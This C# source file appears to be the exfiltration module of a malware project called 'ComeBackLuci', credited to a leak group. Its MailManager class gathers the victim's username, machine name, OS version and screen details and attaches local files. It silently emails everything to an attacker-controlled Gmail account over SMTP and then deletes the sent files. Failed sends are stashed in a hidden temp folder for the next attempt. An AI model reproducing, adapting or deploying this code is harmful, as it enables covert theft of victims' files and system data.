﻿using System;
using System.IO;
using System.Windows.Forms;
using System.Collections.Generic;
using MimeKit;
using MailKit.Net.Smtp;
using MailKit.Security;
using ComeBackLuci.Properties;
using static ComeBackLuci.MGLOBAL;

namespace ComeBackLuci
{
    public static class MGLOBAL
    {
        public const string SERVER = "smtp.gmail.com";
        public const int PORT = 587;

        public static string GetEmailName(string email)
        {
            int limit = email.IndexOf('@');

            return limit != -1 ? email.Substring(0, limit) : email;
        }
    }

    public class MailAttachment : IDisposable
    {
        public MimePart FileConfig { get; set; }

        public FileStream FileData { get; set; }

        public MailAttachment(MimePart fconfig, FileStream fdata)
        {
            this.FileConfig = fconfig;

            this.FileData = fdata;
        }

        public void Dispose()
        {
            FileConfig?.Dispose();

            FileData?.Dispose();
        }
    }

    public class MailManager : IDisposable
    {
        private List<MailAttachment> _attachments;

        private MimeMessage _message;
        private Multipart _mixer;
        private TextPart _body;

        private string _user;
        private string _password;

        public MailManager(string email,string password,bool sendMe = false)
        {
            this._user = email;
            this._password = password;

            this._body = new TextPart("plain") { Text = $"Install path: {Application.StartupPath}\nOS: {Environment.OSVersion}\nUser: {Environment.UserName}\nMachine: {Environment.MachineName}\nProcessor: {Environment.ProcessorCount}\nScreen: {Screen.PrimaryScreen.Bounds.Size.Width} x {Screen.PrimaryScreen.Bounds.Size.Height}\n\ngithub.com/RazeLeakers | M3RFR3T & RESTART2LIFE" };

            this._mixer = new Multipart();

            this._message = new MimeMessage() { Subject = "ComeBackLuci" };

            string ename = GetEmailName(email);

            this._message.From.Add(new MailboxAddress(ename, _user));
            if (sendMe) this._message.To.Add(new MailboxAddress(ename, _user));

            this._attachments = new List<MailAttachment>();
        }

        public void AddRecipient(string recipMail)
        {
            if (string.IsNullOrWhiteSpace(recipMail)) return;

            _message.To.Add(new MailboxAddress(GetEmailName(recipMail), recipMail));
        }

        public void SetSubject(string subject)
        {
            if (string.IsNullOrWhiteSpace(subject)) return;

            _message.Subject = subject;
        }

        public void SetBody(string content)
        {
            if (content == null) return;

            _body.Text = content;
        }

        public void AddAttachment(string filePath)
        {
            if (!File.Exists(filePath)) return;

            FileStream fs;

            try { fs = File.OpenRead(filePath); }
            catch { return; }

            MimePart mp = new MimePart("text", "plain")
            {
                Content = new MimeContent(fs, ContentEncoding.Default),
                ContentDisposition = new ContentDisposition(ContentDisposition.Attachment),
                ContentTransferEncoding = ContentEncoding.QuotedPrintable,
                FileName = Path.GetFileName(filePath)
            };

            _attachments.Add(new MailAttachment(mp, fs));
        }

        public void Send(bool debug = false)
        {
            AddErrorAttachments();

            if (_attachments.Count > 0)
            {
                _mixer.Clear();

                _mixer.Add(_body);

                _attachments.ForEach((e) => _mixer.Add(e.FileConfig));

                _message.Body = _mixer;
            }
            else _message.Body = _body;

            try
            {
                using (SmtpClient client = new SmtpClient())
                {
                    client.CheckCertificateRevocation = false;
                    client.Connect(SERVER, PORT, SecureSocketOptions.StartTls);
                    client.Authenticate(_user, _password);
                    client.Send(_message);
                    client.Disconnect(true);
                }

                DeleteAttachments();

                if (debug) MessageBox.Show("Message SEND!", "ComeBackLuci", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MoveErrorAttachments();

                if (debug) MessageBox.Show($"ERROR:{Environment.NewLine}{ex.Message}", "ComeBackLuci", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string GetErrorDir()
        {
            string errorDir = Settings.Default.ErrorDir;

            if (!Directory.Exists(errorDir))
            {
                string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());

                Directory.CreateDirectory(tempPath);

                errorDir = tempPath;

                Settings.Default.ErrorDir = errorDir;
                Settings.Default.Save();
            }

            return errorDir;
        }

        private void AddErrorAttachments()
        {
            foreach (var file in Directory.GetFiles(GetErrorDir())) AddAttachment(file);
        }

        private void MoveErrorAttachments()
        {
            string errorDir = GetErrorDir();

            _attachments.ForEach(e =>
            {
                string fname = e.FileData.Name;

                if (errorDir != Path.GetDirectoryName(fname))
                {
                    e.FileConfig.Content.Dispose();

                    e.FileData.Dispose();

                    string fres = Path.Combine(errorDir, Path.GetFileName(fname));

                    File.Move(fname, fres);

                    FileStream fs = File.OpenRead(fres);

                    e.FileConfig.Content = new MimeContent(fs, ContentEncoding.Default);

                    e.FileData = fs;
                }
            });
        }

        private void DeleteAttachments()
        {
            _attachments.ForEach((e) =>
            {
                string fname = e.FileData.Name;

                e.Dispose();

                File.Delete(fname);
            });

            _attachments.Clear();
        }

        private void ClearAttachments()
        {
            _attachments.ForEach((e) => e.Dispose());
            _attachments.Clear();
        }

        public void Dispose()
        {
            _body?.Dispose();

            _mixer?.Dispose();

            _message?.Dispose();

            ClearAttachments();
        }
    }
}